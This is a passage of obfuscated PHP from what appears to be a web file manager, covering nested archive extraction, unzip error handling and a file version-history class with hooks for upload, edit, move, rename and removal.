$Õ ¤›Ï³[1335], $Õ ¤›Ï³[1336])); if (!$şâ¬á„ && ($ŠÎƒƒÊ§[$Õ ¤›Ï³[1255]] == -1 || $ó–şî¼Ø)) { $…ş’´Œ» = $õæ™Ë­ƒ[$Õ ¤›Ï³[1328]] . get_path_this($õæ™Ë­ƒ[$Õ ¤›Ï³[232]]) . $Õ ¤›Ï³[1337]; if (!IO::exist($…ş’´Œ»)) { $ˆ§ª¦ÜÆ = $ŠÎƒƒÊ§[$Õ ¤›Ï³[1255]] == -1 ? get_path_ext(IO::pathThis($Ò’ÑéËŞ[$Õ ¤›Ï³[87]])) : get_path_ext($õæ™Ë­ƒ[$Õ ¤›Ï³[232]]); $†ªûÏÌª = KodArchive::listContent(self::iconvSystem($õæ™Ë­ƒ[$Õ ¤›Ï³[232]]), !0, $ˆ§ª¦ÜÆ); self::unzipErrorCheck($†ªûÏÌª, array($Õ ¤›Ï³[1338], $Ò’ÑéËŞ, $õæ™Ë­ƒ)); @file_put_contents($…ş’´Œ», json_encode($†ªûÏÌª[$Õ ¤›Ï³[1339]])); } return @json_decode(IO::getContent($…ş’´Œ»), !0); } IO::fileOut($õæ™Ë­ƒ[$Õ ¤›Ï³[232]], $şâ¬á„, get_path_this($ŠÎƒƒÊ§[$Õ ¤›Ï³[32]])); die; } private static function zipFileList($ØÇÉô», $Ó¿ƒõùğ = false) { $ûÊ•ˆ­ =& $_SERVER[±Ö‰ô½¯]; $§ı‰Ü = array(); foreach ($ØÇÉô» as $ê²ÒèÍ) { $‚øâ“¯Ë = $ê²ÒèÍ[$ûÊ•ˆ­[87]]; if ($Ó¿ƒõùğ) { $‚øâ“¯Ë = self::copy($ê²ÒèÍ[$ûÊ•ˆ­[87]], $Ó¿ƒõùğ, $ûÊ•ˆ­[924]); } else { $Ã¥ÃÖÛ = self::init($ê²ÒèÍ[$ûÊ•ˆ­[87]]); if ($Ã¥ÃÖÛ->getType() == $ûÊ•ˆ­[107]) { $‚øâ“¯Ë = $Ã¥ÃÖÛ->path; } } if ($‚øâ“¯Ë && self::local()->exist($‚øâ“¯Ë)) { $§ı‰Ü[$ê²ÒèÍ[$ûÊ•ˆ­[87]]] = $‚øâ“¯Ë; } } if (!empty($§ı‰Ü)) { return array_values($§ı‰Ü); } show_json(LNG($ûÊ•ˆ­[1297]), !1); } private static function localFilePath($¦×…¼“é) { $‰‡ƒ™Õ =& $_SERVER[±Ö‰ô½¯]; $æ‡Ä¹™ê = KodIO::parse($¦×…¼“é); if ($æ‡Ä¹™ê[$‰‡ƒ™Õ[33]] == KodIO::KOD_SOURCE) { $«•˜¼áÂ = Model($‰‡ƒ™Õ[930])->fileInfoGet(KodIO::sourceID($¦×…¼“é)); if (!$«•˜¼áÂ[$‰‡ƒ™Õ[87]]) { show_json($‰‡ƒ™Õ[1340], !1); } $¦×…¼“é = $«•˜¼áÂ[$‰‡ƒ™Õ[87]]; } $ÙÎõßĞ« = self::init($¦×…¼“é); if ($ÙÎõßĞ«->pathParse[$‰‡ƒ™Õ[1283]]) { $¦×…¼“é = $ÙÎõßĞ«->pathParse[$‰‡ƒ™Õ[1283]]; $ÙÎõßĞ« = self::init($¦×…¼“é); } $É“õ¨àõ = $ÙÎõßĞ«->getType(); if ($É“õ¨àõ == $‰‡ƒ™Õ[107] || $É“õ¨àõ == $‰‡ƒ™Õ[1341]) { if (!$ÙÎõßĞ«->exist($ÙÎõßĞ«->path)) { show_json(LNG($‰‡ƒ™Õ[106]), !1); } return $ÙÎõßĞ«->path; } return !1; } public static function unzipPart($¼Á£«Í¢, $¸Î³È¤® = -1) { $İ»ñ ¾ª =& $_SERVER[±Ö‰ô½¯]; $¢‚´ˆô = IO::pathThis($¼Á£«Í¢); if (!$¸Î³È¤® || $¸Î³È¤® == -1) { $ê¢Úõúœ = array(array($İ»ñ ¾ª[32] => $¢‚´ˆô, $İ»ñ ¾ª[1255] => -1)); $ê¢Úõúœ[0][$İ»ñ ¾ª[1342]] = $ê¢Úõúœ[0][$İ»ñ ¾ª[32]]; } else { if (is_array($¸Î³È¤®)) { $ê¢Úõúœ = $¸Î³È¤®; $•ÆŒä€§ = count($ê¢Úõúœ) - 1; for ($Œñã¸Šê = 0; $Œñã¸Šê <= $•ÆŒä€§; $Œñã¸Šê++) { $µ¦¬™Ş² = $ê¢Úõúœ[$Œñã¸Šê]; $„Ü€ú°Õ = get_path_this($µ¦¬™Ş²[$İ»ñ ¾ª[32]]) . (checkExtSafe($µ¦¬™Ş²[$İ»ñ ¾ª[32]]) ? $İ»ñ ¾ª[12] : $İ»ñ ¾ª[1343]); $ê¢Úõúœ[$Œñã¸Šê][$İ»ñ ¾ª[1342]] = $İ»ñ ¾ª[1344] . intval($µ¦¬™Ş²[$İ»ñ ¾ª[1255]]) . $İ»ñ ¾ª[474] . $„Ü€ú°Õ; if ($Œñã¸Šê == 0) { continue; } $ê¢Úõúœ[$Œñã¸Šê][$İ»ñ ¾ª[1342]] = $ê¢Úõúœ[$Œñã¸Šê - 1][$İ»ñ ¾ª[1342]] . $İ»ñ ¾ª[1345] . $ê¢Úõúœ[$Œñã¸Šê][$İ»ñ ¾ª[1342]]; } } } if (!is_array($ê¢Úõúœ) || count($ê¢Úõúœ) == 0) { return !1; } $˜†™ÀÑ = $ê¢Úõúœ[count($ê¢Úõúœ) - 1]; if (!IO::exist($¼Á£«Í¢)) { return !1; } $ûœ‚Ô = TEMP_FILES . $İ»ñ ¾ª[1346] . kodIO::hashPathSafe($¼Á£«Í¢) . $İ»ñ ¾ª[8]; $Öéôùã· = $ûœ‚Ô . $˜†™ÀÑ[$İ»ñ ¾ª[1342]]; mk_dir($ûœ‚Ô); file_put_contents(TEMP_FILES . $İ»ñ ¾ª[1319], $İ»ñ ¾ª[12]); if (IO::exist($Öéôùã·)) { return array($İ»ñ ¾ª[232] => $Öéôùã·, $İ»ñ ¾ª[1327] => $ê¢Úõúœ, $İ»ñ ¾ª[1328] => $ûœ‚Ô); } $…¬úÒò® = self::localFilePath($¼Á£«Í¢); if (!$…¬úÒò®) { $…¬úÒò® = $ûœ‚Ô . $İ»ñ ¾ª[1347]; if (!IO::exist($…¬úÒò®)) { self::copy($¼Á£«Í¢, $ûœ‚Ô, !1, get_path_this($…¬úÒò®)); } } if (!$…¬úÒò® || !IO::exist($…¬úÒò®)) { return !1; } if ($˜†™ÀÑ[$İ»ñ ¾ª[1255]] == -1) { return array($İ»ñ ¾ª[232] => $…¬úÒò®, $İ»ñ ¾ª[1327] => $ê¢Úõúœ, $İ»ñ ¾ª[1328] => $ûœ‚Ô); } $ê­Êø« = $…¬úÒò®; foreach ($ê¢Úõúœ as $Œñã¸Šê => $µ¦¬™Ş²) { if (!$µ¦¬™Ş² || $µ¦¬™Ş²[$İ»ñ ¾ª[1255]] == $İ»ñ ¾ª[1326]) { break; } if (substr($µ¦¬™Ş²[$İ»ñ ¾ª[32]], -1, 1) == $İ»ñ ¾ª[8]) { break; } $…€Çááú = in_array(get_path_ext($µ¦¬™Ş²[$İ»ñ ¾ª[1342]]), array($İ»ñ ¾ª[390], $İ»ñ ¾ª[1332], $İ»ñ ¾ª[1333], $İ»ñ ¾ª[1334], $İ»ñ ¾ª[1335], $İ»ñ ¾ª[1336])); $ëƒëÉİ¹ = $Œñã¸Šê == count($ê¢Úõúœ) - 1 && $…€Çááú; $ñÅ•¸•ç = $ûœ‚Ô . $µ¦¬™Ş²[$İ»ñ ¾ª[1342]]; $ƒéµû÷º = $ûœ‚Ô . get_path_this($µ¦¬™Ş²[$İ»ñ ¾ª[32]]); if (IO::exist($ñÅ•¸•ç)) { $ê­Êø« = $ñÅ•¸•ç; continue; } $•¨²”Ã“ = $Œñã¸Šê == 0 ? get_path_ext($¢‚´ˆô) : get_path_ext($ê­Êø«); $ÓÄû’ì¬ = KodArchive::extract(self::iconvSystem($ê­Êø«), $ûœ‚Ô, $µ¦¬™Ş²[$İ»ñ ¾ª[1255]], $Åàß¢µ·, $•¨²”Ã“); self::unzipErrorCheck($ÓÄû’ì¬, array($İ»ñ ¾ª[1348], $¼Á£«Í¢, $ê¢Úõúœ, $µ¦¬™Ş², $ñÅ•¸•ç)); if (IO::exist($ƒéµû÷º)) { IO::rename($ƒéµû÷º, get_path_this($ñÅ•¸•ç)); } $ê­Êø« = $ñÅ•¸•ç; } $Öéôùã· = $ê­Êø«; return array($İ»ñ ¾ª[232] => $ê­Êø«, $İ»ñ ¾ª[1327] => $ê¢Úõúœ, $İ»ñ ¾ª[1328] => $ûœ‚Ô); } private static function unzipErrorCheck($‹ÄÚ©, $Âµ³ô¹€ = false) { $é¨ë–¦¡ =& $_SERVER[±Ö‰ô½¯]; if ($‹ÄÚ©[$é¨ë–¦¡[1349]]) { return !0; } write_log(array($é¨ë–¦¡[1350], $‹ÄÚ©, $Âµ³ô¹€), $é¨ë–¦¡[1351]); $¶–ŒØşŞ = is_array($‹ÄÚ©[$é¨ë–¦¡[1339]]) ? json_encode($‹ÄÚ©[$é¨ë–¦¡[1339]]) : $‹ÄÚ©[$é¨ë–¦¡[1339]]; show_json($é¨ë–¦¡[1352] . $¶–ŒØşŞ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ğ÷’£Ğó =& $_SERVER[±Ö‰ô½¯]; $Üü‹ ”‰ = $GLOBALS[$Ğ÷’£Ğó[6]][$Ğ÷’£Ğó[92]]; if ($Üü‹ ”‰[$Ğ÷’£Ğó[1353]] != 1) { return; } if ($Üü‹ ”‰[$Ğ÷’£Ğó[1354]] <= 0) { return; } if (isset($_REQUEST[$Ğ÷’£Ğó[1355]]) && $_REQUEST[$Ğ÷’£Ğó[1355]] == $Ğ÷’£Ğó[91]) { return; } Hook::bind($Ğ÷’£Ğó[1356], $Ğ÷’£Ğó[1357]); Hook::bind($Ğ÷’£Ğó[1358], $Ğ÷’£Ğó[1359]); Hook::bind($Ğ÷’£Ğó[1360], $Ğ÷’£Ğó[1361]); Hook::bind($Ğ÷’£Ğó[1362], $Ğ÷’£Ğó[1363]); Hook::bind($Ğ÷’£Ğó[1364], $Ğ÷’£Ğó[1365]); Hook::bind($Ğ÷’£Ğó[1366], $Ğ÷’£Ğó[1367]); } public static function eventBeforeUpload($ú«ÕÄ˜) { if ($ú«ÕÄ˜[3] && $ú«ÕÄ˜[3] != REPEAT_REPLACE) { return; } $“•”¼Å = self::parsePath($ú«ÕÄ˜[0]); if (!$“•”¼Å) { return; } self::add($“•”¼Å); } public static function eventBeforeEdit($¿¿»çıÏ) { $×Œ¾¯‘á = self::parsePath($¿¿»çıÏ[0]); if (!$×Œ¾¯‘á) { return; } self::add($×Œ¾¯‘á); } public static function eventBeforeCopyFile($°“êÕÓ, $Õõ¸‡ŸÔ, $üÊ½·®, $Á«î‡Ö, $Şç¾ç§, $¶¶êÃËø) { $’ş½¸Ï =& $_SERVER[±Ö‰ô½¯]; if (isset($üÊ½·®->_data[$’ş½¸Ï[1287]]) && $üÊ½·®->_data[$’ş½¸Ï[1287]]) { return; } $ÅëÜóÏË = $üÊ½·®->getPathOuter($Á«î‡Ö); $±ŞÈ’ŞÊ = self::parsePath($ÅëÜóÏË); if (!$±ŞÈ’ŞÊ) { return; } self::add($±ŞÈ’ŞÊ); } public static function eventBeforeRename($ÄÒƒ£á) { $Æ¥Ÿö¹ =& $_SERVER[±Ö‰ô½¯]; $Ë„ôíø¯ = self::parsePath($ÄÒƒ£á[0]); if (!$Ë„ôíø¯) { return; } $ıí¹’ªŒ = self::checkInHistory($Ë„ôíø¯); if (!$ıí¹’ªŒ) { return; } if ($ıí¹’ªŒ[$Æ¥Ÿö¹[33]] == $Æ¥Ÿö¹[232]) { $–ñ§ä˜³ = self::listData($Ë„ôíø¯); if ($–ñ§ä˜³ && $–ñ§ä˜³[$Æ¥Ÿö¹[447]]) { self::moveHistory($Ë„ôíø¯, $ÄÒƒ£á[1]); } } else { IO::rename($ıí¹’ªŒ[$Æ¥Ÿö¹[87]], $ÄÒƒ£á[1]); } } public static function eventBeforeMove($ÕíˆÎ·›) { $ëà«Œã =& $_SERVER[±Ö‰ô½¯]; $ç¯–öğŒ = self::parsePath($ÕíˆÎ·›[0]); if (!$ç¯–öğŒ) { return; } $Ó¤÷ïÈš = self::parsePath($ÕíˆÎ·›[1]); if (!$Ó¤÷ïÈš) { return; } $—„ˆş‰ï = $ÕíˆÎ·›[3]; $¨¨Ë†Àû = self::checkInHistory($ç¯–öğŒ); if (!$¨¨Ë†Àû) { return; } $™©ÍÊ = self::pathHistory($Ó¤÷ïÈš); if ($¨¨Ë†Àû[$ëà«Œã[33]] == $ëà«Œã[232]) { $´Çõ¶± = self::listData($ç¯–öğŒ); $ÍÏ•çÇ« = rtrim($Ó¤÷ïÈš, $ëà«Œã[8]) . $ëà«Œã[8] . ($—„ˆş‰ï ? $—„ˆş‰ï : get_path_this($ç¯–öğŒ)); $ÆÌÎôª = self::listData($ÍÏ•çÇ«); if ($´Çõ¶± && $´Çõ¶±[$ëà«Œã[447]] && $ÆÌÎôª && $ÆÌÎôª[$ëà«Œã[447]]) { return self::clear($ç¯–öğŒ); } if ($´Çõ¶± && $´Çõ¶±[$ëà«Œã[447]]) { self::moveHistory($ç¯–öğŒ, $—„ˆş‰ï, $™©ÍÊ); } } else { IO::move($¨¨Ë†Àû[$ëà«Œã[87]], $™©ÍÊ, !1, $—„ˆş‰ï); self::clearEmptyFolder(IO::pathFather($¨¨Ë†Àû[$ëà«Œã[87]])); } } public static function eventAfterRemove($ªÇÅ ¨ì, $¨ÍÒ®ï¥) { $õÒÍ§Ì‹ =& $_SERVER[±Ö‰ô½¯]; if (!$¨ÍÒ®ï¥) { return; } $Ç™ûø’® = self::parsePath($ªÇÅ ¨ì[0]); if (!$Ç™ûø’®) { return; } $õäïİ¹õ = self::checkInHistory($Ç™ûø’®); if (!$õäïİ¹õ) { return; } if ($õäïİ¹õ[$õÒÍ§Ì‹[33]] == $õÒÍ§Ì‹[232]) { $íƒßßÂ¨ = self::listData($Ç™ûø’®, !1); if ($íƒßßÂ¨ && $íƒßßÂ¨[$õÒÍ§Ì‹[447]]) { self::clear($Ç™ûø’®, !1); } } else { IO::remove($õäïİ¹õ[$õÒÍ§Ì‹[87]]); self::clearEmptyFolder(IO::pathFather($õäïİ¹õ[$õÒÍ§Ì‹[87]])); } } private static function checkInHistory($ª±ûúææ) { $ÌşèÙÇÕ = self::pathHistory($ª±ûúææ); if (!IO::exist($ÌşèÙÇÕ)) { $ÌşèÙÇÕ .= $_SERVER[±Ö‰ô½¯][1368]; } return IO::exist($ÌşèÙÇÕ) ? IO::info($ÌşèÙÇÕ) : !1; } private static function parsePath($¦ü£ã·€) { $ŞãÈµì =& $_SERVER[±Ö‰ô½¯]; if (!$¦ü£ã·€) { return !1; } if (isset($GLOBALS[$ŞãÈµì[1369]]) && $GLOBALS[$ŞãÈµì[1369]]) { return; } $ÂìöÆ· = KodIO::parse($¦ü£ã·€); $Õäó¼’¡ = $ÂìöÆ·[$ŞãÈµì[33]]; $‹Ùà›¤Ş = !$Õäó¼’¡ || $Õäó¼’¡ == KodIO::KOD_IO || $Õäó¼’¡ == KodIO::KOD_SHARE_ITEM; if (!$‹Ùà›¤Ş || !$ÂìöÆ·[$ŞãÈµì[1370]]) { return !1; } if (substr($¦ü£ã·€, 0, strlen(DATA_PATH . $ŞãÈµì[1371])) == DATA_PATH . $ŞãÈµì[1371]) { return !1; } if ($Õäó¼’¡ == KodIO::KOD_SHARE_ITEM) { $à«´å’Û = IO::init($¦ü£ã·€); if ($à«´å’Û->pathParse[$ŞãÈµì[1283]]) { return self::parsePath($à«´å’Û->pathParse[$ŞãÈµì[1283]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $èÛ‘áí» = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ŞãÈµì[1372]); foreach ($èÛ‘áí» as $”ïÓ“£Š) { if (!$Õäó¼’¡ && substr($¦ü£ã·€, 0, strlen($”ïÓ“£Š)) == $”ïÓ“£Š) { return !1; } } self::log($GLOBALS[$ŞãÈµì[1277]] . $ŞãÈµì[1373] . $¦ü£ã·€); return $¦ü£ã·€; } private static function pathHistory($®·İ¹±“) { $…ÌéûÈ =& $_SERVER[±Ö‰ô½¯]; $˜Ï®‚àØ = self::$_historyBase . ltrim(KodIO::clear($®·İ¹±“), $…ÌéûÈ[8]); $˜Ï®‚àØ = str_replace(array($…ÌéûÈ[1374]), array($…ÌéûÈ[1375]), $˜Ï®‚àØ); return $˜Ï®‚àØ; } public static function log($¡£Á¾³ä) { } public static function historyCount($ã·‘íÓÒ) { $‡ùˆŸÅ• =& $_SERVER[±Ö‰ô½¯]; $Ô§õÅîº = array(); $¢î¶¾Ö = array(); foreach ($ã·‘íÓÒ as $ÚÚê€ë€) { $“±À¨Ä = get_path_father($ÚÚê€ë€); if (!$¢î¶¾Ö[$“±À¨Ä]) { $¢î¶¾Ö[$“±À¨Ä] = array(); } $¢î¶¾Ö[$“±À¨Ä][] = get_path_this($ÚÚê€ë€); } foreach ($¢î¶¾Ö as $“±À¨Ä => $ì½ç®Ö—) { $®Ø†ÖıÈ = self::parsePath($“±À¨Ä); if (!$®Ø†ÖıÈ) { continue; } foreach ($ì½ç®Ö— as $ƒÉ €™) { $‰Äƒ€œ = self::listData(rtrim($®Ø†ÖıÈ, $‡ùˆŸÅ•[8]) . $‡ùˆŸÅ•[8] . $ƒÉ €™, !1); if ($‰Äƒ€œ && $‰Äƒ€œ[$‡ùˆŸÅ•[447]]) { $Ô§õÅîº[rtrim($“±À¨Ä, $‡ùˆŸÅ•[8]) . $‡ùˆŸÅ•[8] . $ƒÉ €™] = count($‰Äƒ€œ[$‡ùˆŸÅ•[447]]); } } } return $Ô§õÅîº; } public static function add($²âú¨é¬) { $’Î”Ò =& $_SERVER[±Ö‰ô½¯]; $‰£€­ªí = self::listData($²âú¨é¬); if (!$‰£€­ªí) { return; } $çñ¼¡º¿ = Model($’Î”Ò[870])->get($’Î”Ò[1376]); $Å÷®ÃëÌ = intval($GLOBALS[$’Î”Ò[6]][$’Î”Ò[92]][$’Î”Ò[1354]]); $´ƒ›ªĞÑ = $çñ¼¡º¿ == $’Î”Ò[1377] ? min(5, $Å÷®ÃëÌ) : $Å÷®ÃëÌ; if ($Å÷®ÃëÌ <= 0) { return; } $ßÁäî¤À = IO::info($²âú¨é¬); $©Á€­ï = $‰£€­ªí[$’Î”Ò[447]]; if ($ßÁäî¤À[$’Î”Ò[79]] == 0) { return; } if ($ßÁäî¤À[$’Î”Ò[79]] >= 1024 * 1024 * 500) { return !1; } $ƒ´éÔ‡° = IO::hashSimple($²âú¨é¬); if ($©Á€­ï && $©Á€­ï[0][$’Î”Ò[692]] == $ƒ´éÔ‡°) { return !0; } if (array_key_exists($’Î”Ò[235], $ßÁäî¤À) && !$ßÁäî¤À[$’Î”Ò[235]]) { return !1; } $£“¼ıŠ = short_id(time()); $éáÎ™ß = array($’Î”Ò[484] => $£“¼ıŠ, $’Î”Ò[692] => $ƒ´éÔ‡°, $’Î”Ò[32] => $ßÁäî¤À[$’Î”Ò[32]] . $’Î”Ò[10] . date($’Î”Ò[1378]) . rand_string(1), $’Î”Ò[79] => $ßÁäî¤À[$’Î”Ò[79]], $’Î”Ò[538] => USER_ID, $’Î”Ò[233] => time(), $’Î”Ò[1379] => $’Î”Ò[12]); IO::mkdir($‰£€­ªí[$’Î”Ò[1380]]); $óèÓ½¹Ó = IO::copy($²âú¨é¬, $‰£€­ªí[$’Î”Ò[1380]], !1, $éáÎ™ß[$’Î”Ò[32]]); if (!$óèÓ½¹Ó) { self::clearEmptyFolder($‰£€­ªí[$’Î”Ò[1380]]); return !1; } array_unshift($©Á€­ï, $éáÎ™ß); if (count($©Á€­ï) > $´ƒ›ªĞÑ) { $Ú‡ÍŒŞú = array_slice($©Á€­ï, $´ƒ›ªĞÑ); foreach ($Ú‡ÍŒŞú as $ù×¤ÕÑî) { IO::remove($‰£€­ªí[$’Î”Ò[1380]] . $ù×¤ÕÑî[$’Î”Ò[32]]); } $©Á€­ï = array_slice($©Á€­ï, 0, $´ƒ›ªĞÑ); } return self::saveData($‰£€­ªí[$’Î”Ò[1381]], $©Á€­ï); } public static function remove($–À­ÒŒÍ, $‘ ìÌò) { $Ï”ô¶ =& $_SERVER[±Ö‰ô½¯]; $µ  îëş = self::listData($–À­ÒŒÍ); $…¦å¬® = array(); if (!$µ  îëş) { return !1; } foreach ($µ  îëş[$Ï”ô¶[447]] as $”ßüÑ) { if ($”ßüÑ[$Ï”ô¶[484]] == $‘ ìÌò) { IO::remove($µ  îëş[$Ï”ô¶[1380]] . $”ßüÑ[$Ï”ô¶[32]]); continue; } $…¦å¬®[] = $”ßüÑ; } return self::saveData($µ  îëş[$Ï”ô¶[1381]], $…¦å¬®); } public static function clear($ò›Ê…–™, $¸¿üÚª× = true) { $”üÈÔ½İ =& $_SERVER[±Ö‰ô½¯]; $øöšÁÉ¦ = self::listData($ò›Ê…–™, $¸¿üÚª×); if (!$øöšÁÉ¦) { return !1; } foreach ($øöšÁÉ¦[$”üÈÔ½İ[447]] as $ ƒ¯ê) { IO::remove($øöšÁÉ¦[$”üÈÔ½İ[1380]] . $ ƒ¯ê[$”üÈÔ½İ[32]]); } return self::saveData($øöšÁÉ¦[$”üÈÔ½İ[1381]], array()); } public static function moveHistory($¿ùÔÊ¶ì, $§†‚Ù‹‡ = '', $äèªó¡ù = '') { $ìóàç¶Ú =& $_SERVER[±Ö‰ô½¯]; $éæÂ‘¥ = self::listData($¿ùÔÊ¶ì, !1); if (!$éæÂ‘¥ || !$éæÂ‘¥[$ìóàç¶Ú[447]]) { return !1; } $íÜÓúÇó = $ìóàç¶Ú[1368]; $§†‚Ù‹‡ = $§†‚Ù‹‡ ? $§†‚Ù‹‡ : get_path_this($¿ùÔÊ¶ì); $äèªó¡ù = $äèªó¡ù ? $äèªó¡ù : $éæÂ‘¥[$ìóàç¶Ú[1380]]; $Ší•ãÂ« = substr(get_path_this($éæÂ‘¥[$ìóàç¶Ú[1381]]), 0, -strlen($íÜÓúÇó)); foreach ($éæÂ‘¥[$ìóàç¶Ú[447]] as $¶ƒˆØ°À => $’áÏ“º›) { $å˜â   = $§†‚Ù‹‡ . substr($’áÏ“º›[$ìóàç¶Ú[32]], strlen($Ší•ãÂ«)); $õÕ¶å–À = IO::move($éæÂ‘¥[$ìóàç¶Ú[1380]] . $’áÏ“º›[$ìóàç¶Ú[32]], $äèªó¡ù, !1, $å˜â  ); if ($õÕ¶å–À) { $éæÂ‘¥[$ìóàç¶Ú[447]][$¶ƒˆØ°À][$ìóàç¶Ú[32]] = $å˜â  ; } } $éæÂ‘¥[$ìóàç¶Ú[1381]] = IO::move($éæÂ‘¥[$ìóàç¶Ú[1381]], $äèªó¡ù, !1, $§†‚Ù‹‡ . $íÜÓúÇó); self::saveData($éæÂ‘¥[$ìóàç¶Ú[1381]], $éæÂ‘¥[$ìóàç¶Ú[447]]); self::clearEmptyFolder($éæÂ‘¥[$ìóàç¶Ú[1380]]); } public static function rollback($Â‰º€í, $ôç›ç„¦) { $‘¦‰óÈù =& $_SERVER[±Ö‰ô½¯]; $ç¢œ›¹ = self::listData($Â‰º€í); if (!$ç¢œ›¹) { return; } $ìé“Øê½ = IO::info($Â‰º€í); foreach ($ç¢œ›¹[$‘¦‰óÈù[447]] as $çµõ¿¹‘ => $ÚÎú«) { if ($ÚÎú«[$‘¦‰óÈù[484]] == $ôç›ç„¦) { self::add($Â‰º€í); $Ë›úãäÅ = $ç¢œ›¹[$‘¦‰óÈù[1380]] . $ÚÎú«[$‘¦‰óÈù[32]]; $ÉŞ¸¦ù£ = IO::copy($Ë›úãäÅ, IO::pathFather($Â‰º€í), REPEAT_REPLACE, $ìé“Øê½[$‘¦‰óÈù[32]]); if ($ÉŞ¸¦ù£) { self::remove($Â‰º€í, $ôç›ç„¦); } return $ÉŞ¸¦ù£; } } return !1; } public static function setDetail($ëŸ¥¤´ğ, $ÙŸöæÃ±, $Âœ…’Œ¤) { $¼õˆòâ™ =& $_SERVER[±Ö‰ô½¯]; $™¢È¯º¿ = self::listData($ëŸ¥¤´ğ); if (!$™¢È¯º¿) { return; } foreach ($™¢È¯º¿[$¼õˆòâ™[447]] as $ÙŞŸ÷ù => $äÒĞÚ‘Á) { if ($äÒĞÚ‘Á[$¼õˆòâ™[484]] == $ÙŸöæÃ±) { $™¢È¯º¿[$¼õˆòâ™[447]][$ÙŞŸ÷ù][$¼õˆòâ™[1379]] = $Âœ…’Œ¤; self::saveData($™¢È¯º¿[$¼õˆòâ™[1381]], $™¢È¯º¿[$¼õˆòâ™[447]]); return !0; } } return !1; } public static function fileInfo($±ŸÚ×…¬, $÷Ö…Ç) { $•…‘—½õ =& $_SERVER[±Ö‰ô½¯]; $ÏÕ•è´ù = self::listData($±ŸÚ×…¬); if (!$ÏÕ•è´ù) { show_json(LNG($•…‘—½õ[106]), !1); } $‡…í¢ = $•…‘—½õ[12]; foreach ($ÏÕ•è´ù[$•…‘—½õ[447]] as $£Í„ÍŸ => $•ê‹ûŠÒ) { if ($•ê‹ûŠÒ[$•…‘—½õ[484]] != $÷Ö…Ç) { continue; } $‡…í¢ = $ÏÕ•è´ù[$•…‘—½õ[1380]] . $•ê‹ûŠÒ[$•…‘—½õ[32]]; break; } if (!$‡…í¢) { show_json(LNG($•…‘—½õ[106]), !1); } return IO::info($‡…í¢); } public static function fileOut($æ»ºï•˜, $Şı¹ì…Ğ, $Æ±ÜÓ¨é = false) { $ØÈŸÍ§ =& $_SERVER[±Ö‰ô½¯]; $—ØÎÄÀƒ = self::fileInfo($æ»ºï•˜, $Şı¹ì…Ğ); $×Š½ …Ì =& $GLOBALS[$ØÈŸÍ§[7]]; $Æ±ÜÓ¨é = isset($×Š½ …Ì[$ØÈŸÍ§[1331]]) && $×Š½ …Ì[$ØÈŸÍ§[1331]] == 1; if (isset($×Š½ …Ì[$ØÈŸÍ§[33]]) && $×Š½ …Ì[$ØÈŸÍ§[33]] == $ØÈŸÍ§[1382]) { return IO::fileOutImage($—ØÎÄÀƒ[$ØÈŸÍ§[87]], $×Š½ …Ì[$ØÈŸÍ§[1383]]); } IO::fileOut($—ØÎÄÀƒ[$ØÈŸÍ§[87]], $Æ±ÜÓ¨é, get_path_this($æ»ºï•˜)); } public static function listData($ëµƒ‚°, $Ÿ¦İ¶“” = true) { $¬·Ì¨µ =& $_SERVER[±Ö‰ô½¯]; if ($Ÿ¦İ¶“” && !IO::exist($ëµƒ‚°)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ëµƒ‚°, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ùÏÁıÊ· = self::pathHistory($ëµƒ‚°); $§»„ÇÕ° = array($¬·Ì¨µ[1381] => $ùÏÁıÊ· . $¬·Ì¨µ[1368], $¬·Ì¨µ[1380] => rtrim(get_path_father($ùÏÁıÊ·), $¬·Ì¨µ[8]) . $¬·Ì¨µ[8], $¬·Ì¨µ[447] => array()); $»¸İ¹ã‚ = IO::getContent($§»„ÇÕ°[$¬·Ì¨µ[1381]]); if ($»¸İ¹ã‚) { $ı†ÈÛŒ¿ = json_decode($»¸İ¹ã‚, !0); if (is_array($ı†ÈÛŒ¿)) { $§»„ÇÕ°[$¬·Ì¨µ[447]] = $ı†ÈÛŒ¿; } } return $§»„ÇÕ°; } private static function saveData($±Æ»òµ©, $–®Í‡¿Ğ) { $Ô†•¨“ğ =& $_SERVER[±Ö‰ô½¯]; self::log($Ô†•¨“ğ[1384] . $±Æ»òµ© . $Ô†•¨“ğ[74] . count($–®Í‡¿Ğ), $Ô†•¨“ğ[849]); if ($–®Í‡¿Ğ) { return IO::setContent($±Æ»òµ©, json_encode($–®Í‡¿Ğ)); } $Ä¢¬²° = IO::pathFather($±Æ»òµ©); IO::remove($±Æ»òµ©); self::clearEmptyFolder($Ä¢¬²°); return !0; } public static function clearEmptyFolder($à’í¿Šß) { $í²ƒØ« =& $_SERVER[±Ö‰ô½¯]; if (trim($à’í¿Šß, $í²ƒØ«[8]) == trim(self::$_historyBase, $í²ƒØ«[8])) { return; } $Ï¥Ù™¯ = IO::pathFather($à’í¿Šß); $Æ©»µìŞ = IO::has($à’í¿Šß, !0); if ($Æ©»µìŞ[$í²ƒØ«[241]] > 0 || $Æ©»µìŞ[$í²ƒØ«[242]] > 0) { return; } IO::remove($à’í¿Šß); self::clearEmptyFolder($Ï¥Ù™¯); } private static function getBasePath() { $óŞ„÷ˆ÷ =& $_SERVER[±Ö‰ô½¯]; $óÉÕÀä¶ = Model($óŞ„÷ˆ÷[1385])->get($óŞ„÷ˆ÷[1386]); if ($óÉÕÀä¶) { if (!IO::exist($óÉÕÀä¶)) { IO::mkdir($óÉÕÀä¶); } if (get_path_this($óÉÕÀä¶) == $óŞ„÷ˆ÷[1371]) { $×¸èìùé = $óŞ„÷ˆ÷[1387] . rand_string(8); @rename($óÉÕÀä¶, get_path_father($óÉÕÀä¶) . $óŞ„÷ˆ÷[8] . $×¸èìùé); $óÉÕÀä¶ = DATA_PATH . $×¸èìùé . $óŞ„÷ˆ÷[8]; file_put_contents(DATA_PATH . $óŞ„÷ˆ÷[1319], $óŞ„÷ˆ÷[12]); Model($óŞ„÷ˆ÷[1385])->set($óŞ„÷ˆ÷[1386], $óÉÕÀä¶); } return $óÉÕÀä¶; } $óÉÕÀä¶ = DATA_PATH . $óŞ„÷ˆ÷[1387] . rand_string(8) . $óŞ„÷ˆ÷[8]; $óÉÕÀä¶ = IO::mkdir($óÉÕÀä¶); $óÉÕÀä¶ = rtrim($óÉÕÀä¶, 